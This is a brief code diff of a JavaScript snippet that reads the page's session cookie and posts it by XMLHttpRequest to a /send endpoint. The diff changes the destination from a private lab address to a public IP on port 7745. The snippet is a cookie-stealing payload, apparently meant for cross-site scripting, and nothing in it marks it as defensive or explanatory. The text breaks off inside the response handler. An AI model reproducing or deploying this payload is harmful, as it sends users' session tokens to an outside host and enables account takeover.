@@ -1,7 +1,7 @@
 var sessionid = document.cookie.split('=')[1]+".";
 
 var xhr = new XMLHttpRequest();
-xhr.open('POST', 'http://172.20.0.3:5000/send');
+xhr.open('POST', 'http://121.91.173.139:7745/send');
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 
 xhr.onreadystatechange = function() {
